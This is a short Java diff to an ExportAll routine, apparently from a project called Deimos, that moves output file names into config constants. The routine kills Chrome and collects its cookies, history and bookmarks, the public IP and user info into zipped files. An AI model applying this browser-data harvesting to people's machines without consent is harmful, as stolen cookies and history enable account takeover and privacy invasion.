@@ -98,17 +98,17 @@ public class ExportAll {
 		
 		killChrome();
 		
-		ExportBookmarks.retreiveBookmarksAsFile("export-bookmarks.txt");
+		ExportBookmarks.retreiveBookmarksAsFile(DeimosConfig.FILE_OUTPUT_BOOKMARKS);
 		
 		try {
-			ExportCookies.retreiveCookiesAsFile("export-cookies.txt");
+			ExportCookies.retreiveCookiesAsFile(DeimosConfig.FILE_OUTPUT_COOKIES);
 		} catch (SQLiteException e) {
 			
 			e.printStackTrace();
 		}
 		
 		try {
-			ExportHistory.retreiveHistoryAsFile("export-history.txt");
+			ExportHistory.retreiveHistoryAsFile(DeimosConfig.FILE_OUTPUT_HISTORY);
 		}
 		catch (SQLiteException sle) {
 			
@@ -116,14 +116,14 @@ public class ExportAll {
 		}
 		
 		try {
-			ExportIP.retrievePublicIPAsFile("export-publicIP.txt");
+			ExportIP.retrievePublicIPAsFile(DeimosConfig.FILE_OUTPUT_PUBLICIP);
 		} catch (UnknownHostException e) {
 
 			e.printStackTrace();
 		}
 		
 		ExportUserInfo.retrieveUserInfoAsFile("John", "Doe",
-				"male", 1995, "export-userInfo.txt");
+				"male", 1995, null, DeimosConfig.FILE_OUTPUT_USERINFO);
 		
 		Zipper.zipOutputFiles();
 		
